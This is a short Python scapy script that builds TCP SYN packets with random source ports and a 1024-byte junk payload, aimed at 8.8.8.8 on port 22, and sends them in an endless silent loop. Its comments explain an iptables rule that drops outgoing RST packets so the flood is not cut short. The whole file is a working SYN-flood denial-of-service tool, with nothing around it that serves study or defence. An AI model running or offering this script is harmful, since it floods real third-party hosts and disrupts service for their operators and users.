from scapy.all import *
from scapy.layers.inet import IP, TCP

# By default a RST packet will be sent immediately, which is not what we want.
# To prevent this, we can specify an iptables rule.
# Example: iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 8.8.8.8 -j DROP
#
# Essentially, the problem is that scapy runs in user space, and the linux
# kernel will receive the SYN-ACK first. The kernel will send a RST because
# it won't have a socket open on the port number in question, before you
# have a chance to do anything with scapy.

target_ip = '8.8.8.8'
target_port = 22

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
packet = ip/tcp/raw

send(packet, loop=1, verbose=0)
